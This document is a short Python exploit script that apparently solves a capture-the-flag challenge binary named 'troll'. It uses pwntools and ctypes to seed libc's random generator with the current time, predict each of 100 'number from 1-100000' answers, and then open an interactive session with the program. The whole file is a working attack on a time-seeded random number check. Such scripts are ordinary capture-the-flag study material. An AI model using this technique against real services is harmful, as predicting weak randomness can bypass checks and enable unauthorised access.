from pwn import *

import ctypes

ctypes.cdll.LoadLibrary("libc.so.6")
libc = ctypes.CDLL("libc.so.6")

seed = int(libc.time(None))
libc.srand(seed)

p = process("./troll")

p.recvuntil("Who goes there?")
response = p.sendline("any name")

correct = 0

for i in range(100):
    p.recvuntil("I am thinking of a number from 1-100000. What is it?")

    random_number = str((libc.rand() % 100000) + 1)

    p.sendline(random_number)
    p.recvline()

    correct += 1
    print("Correct answers: {}".format(correct))


p.interactive()